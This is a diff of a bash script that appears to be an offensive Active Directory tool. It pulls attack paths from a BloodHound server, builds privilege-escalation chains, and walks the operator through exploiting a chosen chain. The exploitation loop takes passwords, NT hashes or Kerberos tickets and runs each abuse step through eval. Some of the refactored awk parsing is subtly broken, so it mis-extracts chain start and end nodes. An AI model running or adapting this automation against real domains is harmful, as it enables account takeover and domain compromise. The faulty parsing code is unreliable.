@@ -11,6 +11,7 @@ YELLOW='\033[1;33m'     # Messages
 RED='\033[;91m'         # GPO
 MAGENTA='\033[0;95m'    # GPOs (Light Magenta)
 NC='\033[0m'            # No Color
+GRAY='\033[0;90m'       # Gray for less important elements
 BOLD='\033[1m'
 
   echo "============================================================="
@@ -84,6 +85,12 @@ DC_IP=""
 ALL_FLAG=false
 OWNED_FLAG=false
 OWNED_FILE=""
+
+# Use RAM disk if available for temp files
+TMP_DIR="/dev/shm"
+if [[ ! -d "$TMP_DIR" ]]; then
+    TMP_DIR="/tmp"
+fi
 
 # Parse command-line arguments
 while [[ $# -gt 0 ]]; do
@@ -213,118 +220,133 @@ fi
 
 keep_shortest_chains() {
     local input_file="$1"
-
-    if [ ! -f "$input_file" ]; then
-        echo "[-] ERROR: File '$input_file' not found." >&2
-        return 1
-    fi
-
-    declare -A best_chain
-    declare -A best_count
-    declare -A best_line_num
-
-    local line_number=0
-
-    while IFS= read -r line; do
-        ((line_number++))
-        if [[ -z "$line" ]]; then
-            continue
-        fi
-
-        # Extract nodes and count using awk with proper field handling
-        awk_output=$(echo "$line" | awk -F' ---[^>]*--> ' '{
-            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1);
-            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $NF);
-            print $1;
-            print $NF;
-            print NF - 1;
-        }')
+    
+    awk '
+    {
+        # Extract start and end nodes efficiently
+        line = $0
+        gsub(/\033\[[0-9;]*[mGK]/, "")  # Remove colors for processing
         
-        # Read awk output into variables
-        start_node=$(echo "$awk_output" | sed -n '1p')
-        end_node=$(echo "$awk_output" | sed -n '2p')
-        count=$(echo "$awk_output" | sed -n '3p')
-
-        # Skip if we couldn't properly parse the line
-        if [[ -z "$start_node" || -z "$end_node" || -z "$count" ]]; then
-            continue
-        fi
-
-        key="${start_node}|${end_node}"
-
-        if [[ ! -v best_chain["$key"] ]]; then
-            best_chain["$key"]="$line"
-            best_count["$key"]=$count
-            best_line_num["$key"]=$line_number
-        else
-            # Ensure both values are numeric before comparison
-            if [[ "$count" =~ ^[0-9]+$ && "${best_count["$key"]}" =~ ^[0-9]+$ ]]; then
-                if (( count < best_count["$key"] )); then
-                    best_chain["$key"]="$line"
-                    best_count["$key"]=$count
-                    best_line_num["$key"]=$line_number
-                fi
-            else
-                # If not numeric, keep the first occurrence
-                continue
-            fi
-        fi
-    done < "$input_file"
-
-    # Output chains in order of first occurrence
-    for key in "${!best_chain[@]}"; do
-        printf "%d\t%s\n" "${best_line_num[$key]}" "${best_chain[$key]}"
-    done | sort -n -k1,1 | cut -f2-
+        if (match(line, /(.*) ---[^>]*--> (.*)/)) {
+            start_node = substr(line, RSTART, RLENGTH)
+            end_node = substr(line, RSTART + length(start_node))
+            
+            # Count edges by counting "-->"
+            gsub(/[^-]*-[^>]*-->/, "|", line)  # Replace edges with pipes
+            edge_count = split(line, edges, "|") - 1
+            
+            key = start_node "|" end_node
+            
+            if (!(key in best_count) || edge_count < best_count[key]) {
+                best_line[key] = $0  # Keep original colored line
+                best_count[key] = edge_count
+                line_order[key] = NR
+            }
+        }
+    }
+    END {
+        # Output in order of first appearance
+        for (key in line_order) {
+            print line_order[key] "\t" best_line[key]
+        }
+    }
+    ' "$input_file" | sort -n -k1,1 | cut -f2-
 }
 
 make_chains() {
     local input_file="$1"
-    declare -A graph
-    declare -A in_degree
-
-    while IFS= read -r line; do
-        [[ -z "$line" ]] && continue
-        source=$(awk -F '---' '{print $1}' <<< "$line" | awk '{$1=$1;print}')
-        rest=$(awk -F '---' '{print $2}' <<< "$line")
-        edge_type=$(awk -F '-->' '{print $1}' <<< "$rest" | awk '{$1=$1;print}')
-        target=$(awk -F '-->' '{print $2}' <<< "$rest" | awk '{$1=$1;print}')
+    
+    # Use awk for much faster graph processing - NO COLOR VERSION
+    awk '
+    {
+        # Parse line: source ---edge_type--> target
+        if (match($0, /(.*) ---(.*)--> (.*)/)) {
+            source = substr($0, RSTART, RLENGTH)
+            source_clean = substr($0, RSTART, RLENGTH)
+            
+            # Extract components
+            split($0, parts, " ---")
+            source_node = parts[1]
+            rest = parts[2]
+            
+            split(rest, edge_parts, "--> ")
+            edge_type = edge_parts[1]
+            target_node = edge_parts[2]
+            
+            # Clean up whitespace
+            gsub(/[[:space:]]+$/, "", source_node)
+            gsub(/^[[:space:]]+|[[:space:]]+$/, "", edge_type)
+            gsub(/^[[:space:]]+/, "", target_node)
+            
+            # Build adjacency list
+            if (source_node != "" && target_node != "") {
+                adj[source_node] = adj[source_node] "|" edge_type ":" target_node
+                in_degree[target_node]++
+                if (!(source_node in in_degree)) in_degree[source_node] = 0
+            }
+        }
+    }
+    
+    END {
+        # Find starting nodes (in_degree = 0)
+        for (node in in_degree) {
+            if (in_degree[node] == 0) {
+                queue[++qend] = node "|" node
+            }
+        }
         
-        if [[ -n "${graph[$source]}" ]]; then
-            graph[$source]="${graph[$source]}|$edge_type:$target"
-        else
-            graph[$source]="$edge_type:$target"
-        fi
+        # BFS traversal
+        while (qstart < qend) {
+            qstart++
+            split(queue[qstart], parts, "|")
+            node = parts[1]
+            path = parts[2]
+            
+            if (node in adj) {
+                split(adj[node], edges, "|")
+                for (i = 2; i <= length(edges); i++) {
+                    if (edges[i] == "") continue
+                    split(edges[i], edge_parts, ":")
+                    edge_type = edge_parts[1]
+                    next_node = edge_parts[2]
+                    
+                    new_path = path " ---" edge_type "--> " next_node
+                    queue[++qend] = next_node "|" new_path
+                }
+            } else {
+                # This is a terminal node, output the path
+                print path
+            }
+        }
+    }
+    ' "$input_file"
+}
 
-        [[ -z "${in_degree[$source]}" ]] && in_degree[$source]=0
-        in_degree[$target]=$(( ${in_degree[$target]:-0} + 1 ))
-    done < "$input_file"
-
-    starts=()
-    for node in "${!in_degree[@]}"; do
-        [[ ${in_degree[$node]} -eq 0 ]] && starts+=("$node")
+# Function to split work across multiple cores
+parallel_process_chains() {
+    local input_file="$1"
+    local num_cores=$(nproc)
+    local total_lines=$(wc -l < "$input_file")
+    local lines_per_core=$(( (total_lines + num_cores - 1) / num_cores ))
+    
+    # Split input file
+    split -l "$lines_per_core" "$input_file" "${input_file}.part."
+    
+    # Process in parallel
+    for part_file in "${input_file}.part."*; do
+        make_chains "$part_file" > "${part_file}.chains" &
     done
-
-    queue=()
-    for start in "${starts[@]}"; do
-        queue+=("$start|$start")
-    done
-
-    while [[ ${#queue[@]} -gt 0 ]]; do
-        element="${queue[0]}"
-        queue=("${queue[@]:1}")
-        IFS='|' read -r node path_str <<< "$element"
-
-        if [[ -n "${graph[$node]:-}" ]]; then
-            IFS='|' read -ra edges <<< "${graph[$node]}"
-            for edge in "${edges[@]}"; do
-                IFS=':' read -r edge_type next_node <<< "$edge"
-                new_path="$path_str ---$edge_type--> $next_node"
-                queue+=("$next_node|$new_path")
-            done
-        else
-            echo "$path_str"
-        fi
-    done
+    
+    # Wait for all jobs
+    wait
+    
+    # Combine results
+    cat "${input_file}.part."*.chains > "${input_file%.*}_parallel.chains"
+    
+    # Cleanup
+    rm "${input_file}.part."*
+    
+    echo "${input_file%.*}_parallel.chains"
 }
 
 colorize_kind() {
@@ -567,6 +589,31 @@ if [[ $NO_GATHER == false ]]; then
     fi
 fi
 
+show_progress() {
+    local current=$1
+    local total=$2
+    local width=50
+    local percentage=$((current * 100 / total))
+    local completed=$((current * width / total))
+    local remaining=$((width - completed))
+    
+    printf "\r[%-*s] %d%%" "$width" "$(printf '#%.0s' $(seq 1 $completed))" "$percentage"
+}
+
+
+# Process chains with progress
+process_with_progress() {
+    local input_file="$1"
+    local total_lines=$(wc -l < "$input_file")
+    local count=0
+    
+    while IFS= read -r line; do
+        ((count++))
+        show_progress "$count" "$total_lines"
+        # Process line
+    done < "$input_file"
+    echo  # New line after progress
+}
 
 show_color_legend() {
     echo -e "\n${BOLD}LEGEND:${NC}"
@@ -594,7 +641,7 @@ else
     fi
     DACL_JSON=$(curl -s "$BH_URL/api/v2/graphs/cypher" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{\"query\":\"MATCH p=shortestPath((s)-[:Owns|GenericAll|GenericWrite|WriteOwner|WriteDacl|MemberOf|ForceChangePassword|AllExtendedRights|AddMember|HasSession|GPLink|AllowedToDelegate|CoerceToTGT|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|WriteGPLink|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC6a|ADCSESC6b|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|SyncedToEntraUser|CoerceAndRelayNTLMToSMB|CoerceAndRelayNTLMToADCS|WriteOwnerLimitedRights|OwnsLimitedRights|ClaimSpecialIdentity|CoerceAndRelayNTLMToLDAP|CoerceAndRelayNTLMToLDAPS|ContainsIdentity|PropagatesACEsTo|CanApplyGPO|HasTrustKeys|ManageCA|ManageCertificates|DCFor|SameForestTrust|SpoofSIDHistory|AbuseTGTDelegation*1..10]->(t)) WHERE (s:User OR s:Computer) AND (t:User OR t:Computer OR t:Domain OR t:GPO OR t:OU) AND s<>t AND ANY(tag IN s.system_tags WHERE tag = 'owned') AND s.domain = 'EU-IFRIT.VL' RETURN p LIMIT 1000\"}")
 fi
-echo -e "${YELLOW}[*] Query executed, parsing it... ${NC}\n"
+echo -e "\n${GRAY}[*] Query executed, parsing it..."
 
 DACL=$(echo "$DACL_JSON" | jq -r '
   .data as $data |
@@ -619,10 +666,21 @@ DACL=$(echo "$DACL_JSON" | jq -r '
 done)
 
 if [[ ! -z $DACL ]]; then
-    echo $DACL | sed 's/BREAK /\n/g' | sed 's/BREAK//g' | sed "s/@${flt_domain}//g" | sed "s/\.${flt_domain}/\$/g" | sort -u > ./DACL_${flt_domain}
+    echo -e "[*] Building attack chains..."
+    start_time=$(date +%s)
+    
+    # Parse and prepare DACL data
+    echo "$DACL" | sed 's/BREAK /\n/g' | sed 's/BREAK//g' | sed "s/@${flt_domain}//g" | sed "s/\.${flt_domain}/\$/g" | sort -u > ./DACL_${flt_domain}
     align_ad_relationships "./DACL_${flt_domain}" > ./DACL_ALIGN_${flt_domain} && mv ./DACL_ALIGN_${flt_domain} ./DACL_${flt_domain}
-    make_chains ./DACL_${flt_domain} > DACL_ABUSE_${flt_domain}.txt
+    
+    # Use optimized chain building
+    echo -e "[*] Processing $(wc -l < "./DACL_${flt_domain}") relationships..."
+    make_chains "./DACL_${flt_domain}" > "DACL_ABUSE_${flt_domain}.txt"
+    
+    end_time=$(date +%s)
+    echo -e "[+] Chain building completed in $((end_time - start_time)) seconds${NC}"
 
+    # ORIGINAL FILTERING AND DISPLAY LOGIC (unchanged)
     # Admin group truncation
     cat DACL_ABUSE_${flt_domain}.txt | sed 's/\(-> .*KEY ADMINS\).*/\1/' | sed 's/\(-> .*ADMINISTRATORS\).*/\1/' | sed 's/\(-> .*DOMAIN ADMINS\).*/\1/' | sed 's/\(-> .*ENTERPRISE ADMINS\).*/\1/' | sort -u >t;mv t DACL_ABUSE_${flt_domain}.txt
 
@@ -634,40 +692,19 @@ if [[ ! -z $DACL ]]; then
     cat DACL_ABUSE_${flt_domain}.txt | grep -v "ACCOUNT OPERATORS" > t2
     cat t >> t2 && mv t2 DACL_ABUSE_${flt_domain}.txt && rm t
 
-    # Pure MemberOf Chains
+    # Pure MemberOf Chains - extract them but don't remove from main file for display
     cat DACL_ABUSE_${flt_domain}.txt | grep -vE "Owns|GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|AllExtendedRights|AddMember|HasSession|GPLink|AllowedToDelegate|CoerceToTGT|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|WriteGPLink|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|GPOAppliesTo|ADCSESC6a|ADCSESC6b|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|SyncedToEntraUser|CoerceAndRelayNTLMToSMB|CoerceAndRelayNTLMToADCS|WriteOwnerLimitedRights|OwnsLimitedRights|DCFor" --color=never | grep -v ^$ > GRPS_${flt_domain}.txt
+
+    # Pure MemberOf Chains - extract them
+    cat DACL_ABUSE_${flt_domain}.txt | grep -vE "Owns|GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|AllExtendedRights|AddMember|HasSession|GPLink|AllowedToDelegate|CoerceToTGT|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|WriteGPLink|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|GPOAppliesTo|ADCSESC6a|ADCSESC6b|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|SyncedToEntraUser|CoerceAndRelayNTLMToSMB|CoerceAndRelayNTLMToADCS|WriteOwnerLimitedRights|OwnsLimitedRights|DCFor" --color=never | grep -v ^$ > GRPS_${flt_domain}.txt
+
+    # REMOVE PURE MEMBERSHIP CHAINS FROM DACL ABUSE FILE
     while read -r line; do
-        grep -F -v "$line" DACL_ABUSE_${flt_domain}.txt >t; mv t DACL_ABUSE_${flt_domain}.txt
+        grep -F -v "$line" DACL_ABUSE_${flt_domain}.txt > t
+        mv t DACL_ABUSE_${flt_domain}.txt
     done < GRPS_${flt_domain}.txt
-
-    if [[ -f DACL_ABUSE_${flt_domain}.txt ]]; then
-        echo -e "\n---------DACL ABUSE CHAINS----------"
-        awk -F ' ---' '
-        {
-            # Extract the starting node (first part before "---")
-            start_node = $1;
-    
-            # Store all paths by their starting node
-            paths[start_node] = paths[start_node] $0 "\n";
-        }
-        END {
-            # Print all paths grouped by starting node with spacing
-            first_group = 1;
-            for (node in paths) {
-                if (!first_group) {
-                    print "";  # Add empty line between groups
-                }
-                printf "%s", paths[node];
-                first_group = 0;
-            }
-        }' "DACL_ABUSE_${flt_domain}.txt"
-    fi
-
-    if [[ -s GRPS_${flt_domain}.txt ]]; then
-        echo -e "\n-------PURE MEMBERSHIP CHAINS----------"
-        cat GRPS_${flt_domain}.txt
-    fi
 fi
+
 
 grep -oP '\x1b\[0;34m\K[^\x1b]*(?=\x1b\[0m)' DACL_ABUSE_${flt_domain}.txt --color=never > ./OU_TARGETS_${flt_domain}.txt
 if [[ -s ./OU_TARGETS_${flt_domain}.txt ]]; then
@@ -752,131 +789,45 @@ get_unique_sources() {
     printf '%s\n' "${!sources[@]}" | sort
 }
 
-# Main menu - simplified version
+# --------------------------------------Main menu - simplified version
+
+# Display pure membership chains first (information only)
+if [[ -s GRPS_${flt_domain}.txt ]]; then
+    echo -e "\n-------PURE MEMBERSHIP CHAINS (Information Only)----------"
+    cat GRPS_${flt_domain}.txt
+fi
+
+# Read all chains into an array (with colors preserved)
+readarray -t all_chains < "DACL_ABUSE_${flt_domain}.txt"
+
+# Check if we have any chains
+if [ ${#all_chains[@]} -eq 0 ]; then
+    echo -e "[-] ERROR: No valid chains found in file"
+    exit 1
+fi
+
+# Display DACL abuse chains with numbers and colors
+if [[ -s DACL_ABUSE_${flt_domain}.txt ]]; then
+    echo -e "\n---------DACL ABUSE CHAINS (Select to Exploit)----------"
+    for i in "${!all_chains[@]}"; do
+        printf "%2d) %s\n" $((i+1)) "${all_chains[i]}"
+    done
+fi
+
+# Simplified menu - select directly from the numbered chains above
 selected_chains=()
 while true; do
-    echo -e "\nChoose DACL Chains to Exploit:"
-    mapfile -t unique_sources < <(get_unique_sources)
+    echo -e "\nChoose DACL Chain to Exploit:"
+    read -p "Select a chain number (1-${#all_chains[@]}) or 0 to exit: " choice
     
-    # Display menu options
-    for ((i=0; i<${#unique_sources[@]}; i++)); do
-        echo "$((i+1))) ${unique_sources[i]}"
-    done
-    echo "$(( ${#unique_sources[@]} + 1 ))) Exit"
-    
-    # Get user input
-    read -p "Select an option (1-$((${#unique_sources[@]} + 1))): " choice
-    
-    # Validate input
     if [[ "$choice" =~ ^[0-9]+$ ]]; then
-        if (( choice >= 1 && choice <= ${#unique_sources[@]} )); then
-            # Automatically collect all chains for selected source
-            selected_source="${unique_sources[choice-1]}"
-            echo -e "\nSelected: $selected_source"
-            
-            src_strip=$(echo $selected_source | sed 's/\x1B\[[0-9;]*[mGK]//g')
-            src_type=$(color_to_obj $selected_source)
-            if [[ $src_strip == ${USERNAME^^} ]]; then
-                echo -e "Account $selected_source is already compromised!"
-            else
-                if [[ $src_type == "Group" ]]; then
-                    while true; do
-                        read -erp "[?] Input credentials for a member of $selected_source (USER:PASS / USER:HASH / USER:TGT_FILE): " credentials </dev/tty
-                        creds=$(echo $credentials | awk -F":" '{print $2}')
-                        creds_src=$(echo $credentials | awk -F":" '{print $1}')
-
-                        if [[ "$creds" =~ ^[a-fA-F0-9]{32}$ ]]; then
-                            get_ticket $DC_FQDN -u $creds_src -H $creds
-                            if [ $? -eq 0 ]; then break; fi
-                        elif [[ -s $creds ]]; then
-                            cp $creds ./${creds_src^^}.ccache
-                            export KRB5CCNAME="$creds"
-                            klist
-                            break
-                        else
-                            get_ticket $DC_FQDN -u $creds_src -p $creds
-                            if [ $? -eq 0 ]; then break; fi
-                        fi
-                        
-                        echo -e "[-] Authentication failed. Please check your credentials and try again.\n"
-                    done
-                else
-                    while true; do
-                        echo "[?] Choose authentication method for $selected_source:"
-                        echo "  1) Password"
-                        echo "  2) NT hash"
-                        echo "  3) Kerberos ticket file"
-                        read -erp "Select option (1-3): " auth_method </dev/tty
-                        
-                        case $auth_method in
-                            1)
-                                # Password authentication
-                                read -erp "[?] Enter password for $src_strip: " password </dev/tty
-                                echo  # Newline after hidden input
-                                get_ticket "$DC_FQDN" -u "$src_strip" -p "$password"
-                                if [ $? -eq 0 ]; then break; fi
-                                ;;
-                                
-                            2)
-                                # Hash authentication
-                                while true; do
-                                    read -erp "[?] Enter NT hash for $src_strip (32 chars): " nt_hash </dev/tty
-                                    if [[ "$nt_hash" =~ ^[a-fA-F0-9]{32}$ ]]; then
-                                        get_ticket "$DC_FQDN" -u "$src_strip" -H "$nt_hash"
-                                        if [ $? -eq 0 ]; then break 2; fi  # Break both loops on success
-                                        break
-                                    else
-                                        echo "[-] Invalid hash format. Must be 32-character hex string."
-                                    fi
-                                done
-                                ;;
-                                
-                            3)
-                                # Ticket file authentication
-                                while true; do
-                                    read -erp "[?] Enter path to Kerberos ticket file: " ticket_file </dev/tty
-                                    if [[ ! -f "$ticket_file" ]]; then
-                                        echo "[-] File does not exist: $ticket_file"
-                                        break
-                                    fi
-                                    
-                                    if [[ ! -s "$ticket_file" ]]; then
-                                        echo "[-] Ticket file is empty: $ticket_file"
-                                        break
-                                    fi
-                                    
-                                    # Clean the source name for filename
-                                    selected_src_noc=$(echo "$selected_source" | sed -e 's/\x1b\[[0-9;]*m//g')
-                                    cp "$ticket_file" "./${selected_src_noc}.ccache"
-                                    cp "$ticket_file" "./${selected_src_noc,,}.ccache"
-                                    
-                                    export KRB5CCNAME="$ticket_file"
-                                    if klist; then
-                                        break 2  # Break both loops on success
-                                    else
-                                        echo "[-] The provided ticket file is invalid or expired"
-                                        break
-                                    fi
-                                done
-                                ;;
-                                
-                            *)
-                                echo "[-] Invalid selection. Please choose 1, 2, or 3."
-                                ;;
-                        esac
-                        
-                        echo -e "[-] Authentication failed. Please try again.\n"
-                    done             
-                fi
-            fi
-
-            for chain in "${chains[@]}"; do
-                if [[ "$chain" == "$selected_source"* ]]; then
-                    selected_chains+=("$chain")
-                fi
-            done
-            break  # Exit the menu loop
-        elif (( choice == ${#unique_sources[@]} + 1 )); then
+        if (( choice >= 1 && choice <= ${#all_chains[@]} )); then
+            selected_chain="${all_chains[choice-1]}"
+            selected_chains=("$selected_chain")
+            echo -e "\nSelected Chain $choice:"
+            echo -e "$selected_chain\n"
+            break
+        elif (( choice == 0 )); then
             echo "Exiting..."
             exit 0
         else
@@ -885,6 +836,130 @@ while true; do
     else
         echo "Please enter a valid number."
     fi
+done
+# Proceed with exploitation of the single selected chain
+echo -e "\nProceeding with exploitation of selected chain..."
+for chain in "${selected_chains[@]}"; do
+    # Initialize
+    prev_src=""
+    prev_abuse=""
+    prev_source_type=""
+
+    echo "$chain" | \
+    awk -F ' ---|--> ' '{
+        for (i=2; i<=NF; i+=2) {
+            abuse = $i;
+            source = $(i-1);
+            target = $(i+1);
+            printf "%s \"%s\" \"%s\"\n", abuse, source, target;
+        }
+    }' | \
+    
+    while read -r cmd; do
+        source=$(echo "$cmd" | awk -F'"' '{print $2}')
+        source_type=$(color_to_obj "$source")
+        type=$(color_to_obj "$(echo "$cmd" | awk -F'"' '{print $4}')")
+        abuse=$(echo "$cmd" | awk '{print $1}' | sed 's/\x1B\[[0-9;]*[mGK]//g')
+
+        if [[ "$prev_abuse" == "MemberOf" && "$prev_source_type" == "User" ]]; then
+            SRC="$prev_src"
+        elif [[ "$source_type" == "Group" && "$prev_abuse" != "MemberOf" ]]; then
+            while true; do
+                # Ask for username for group member
+                read -erp $'[?] Enter username for a member of '"${source}"$'\e[0m: ' username </dev/tty
+                if [[ "$username" == *\$ ]]; then
+                    SRC=$(echo "${username%\$}" | tr '[:lower:]' '[:upper:]')"\$"
+                else
+                    SRC=$(echo "$username" | tr '[:lower:]' '[:upper:]')
+                fi
+                
+                # Authentication menu
+                echo "[?] Choose authentication method for $SRC:"
+                echo "  1) Password"
+                echo "  2) NT hash"
+                echo "  3) Kerberos ticket file"
+                read -erp "Select option (1-3): " auth_method </dev/tty
+                
+                case $auth_method in
+                    1)
+                        read -erp "[?] Enter password for $SRC: " password </dev/tty
+                        echo
+                        get_ticket "$DC_FQDN" -u "$SRC" -p "$password"
+                        [ $? -eq 0 ] && break
+                        ;;
+                    2)
+                        while true; do
+                            read -erp "[?] Enter NT hash for $SRC (32 chars): " nt_hash </dev/tty
+                            if [[ "$nt_hash" =~ ^[a-fA-F0-9]{32}$ ]]; then
+                                get_ticket "$DC_FQDN" -u "$SRC" -H "$nt_hash"
+                                [ $? -eq 0 ] && break 2
+                                break
+                            else
+                                echo "[-] Invalid hash format. Must be 32-character hex string."
+                            fi
+                        done
+                        ;;
+                    3)
+                        while true; do
+                            read -erp "[?] Enter path to Kerberos ticket file: " ticket_file </dev/tty
+                            if [[ -f "$ticket_file" && -s "$ticket_file" ]]; then
+                                cp "$ticket_file" "./${SRC}.ccache"
+                                export KRB5CCNAME="./${SRC}.ccache"
+                                klist && break 2 || echo "[-] Invalid/expired ticket file"; break
+                            else
+                                echo "[-] Invalid ticket file"
+                                break
+                            fi
+                        done
+                        ;;
+                    *)
+                        echo "[-] Invalid selection. Please choose 1, 2, or 3."
+                        ;;
+                esac
+                echo -e "[-] Authentication failed. Please try again.\n"
+            done
+        else
+            SRC="$source"
+        fi
+
+        # Store current values for next iteration
+        prev_abuse="$abuse"
+        prev_src="$SRC"
+        prev_source_type="$source_type"
+
+        # Execute the command
+        echo "$abuse $DC_FQDN \"$(echo "$SRC" | sed 's/\x1B\[[0-9;]*[mGK]//g')\" \"$(echo "$cmd" | awk -F"\"" '{print $4}' | sed 's/\x1B\[[0-9;]*[mGK]//g')\" $type" | sed 's/\x1B\[[0-9;]*[mGK]//g' | \
+        while read -r exec_cmd; do
+            # Execute the command and capture the exit status
+            eval "$exec_cmd"
+            exit_status=$?
+
+            # Check if the command failed (non-zero exit status)
+            if [ $exit_status -ne 0 ]; then
+                echo -e "\n${RED}[!] $abuse failed${NC}" >/dev/tty
+
+                # Prompt user for action
+                while true; do
+                    read -p "[?] Do you want to (S)kip or (R)etry? [S/R]: " choice </dev/tty
+                    case "$choice" in
+                        [Ss]* ) 
+                            echo -e "[~] Skipping to next command..." >/dev/tty
+                            break  # Exit the retry loop, proceed to next command
+                            ;;
+                        [Rr]* ) 
+                            echo -e "[~] Retrying..." >/dev/tty
+                            if eval "$exec_cmd"; then  # This automatically checks for exit status 0
+                                break  # Success, proceed to next command
+                            fi
+                            ;;
+                        * ) 
+                            echo -e "[!] Invalid choice. Please enter S (Skip) or R (Retry)." >/dev/tty
+                            ;;
+                    esac
+                done
+            fi
+        done
+    done
 done
 
 
